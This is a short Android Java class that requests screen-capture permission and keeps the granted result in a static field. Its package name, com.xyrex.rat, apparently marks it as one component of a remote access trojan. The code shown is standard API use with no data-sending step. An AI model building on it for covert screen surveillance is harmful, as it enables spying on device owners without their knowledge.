package com.xyrex.rat;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
public class ScreenCaptureActivity extends Activity {
    public static int RESULT_CODE = 1001;
    public static Intent RESULT_DATA = null;
    @Override protected void onCreate(Bundle b){
        super.onCreate(b);
        MediaProjectionManager m = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        startActivityForResult(m.createScreenCaptureIntent(), RESULT_CODE);
    }
    @Override protected void onActivityResult(int req, int res, Intent data){
        if (req == RESULT_CODE && res == RESULT_OK){ RESULT_DATA = data; }
        finish();
    }
}
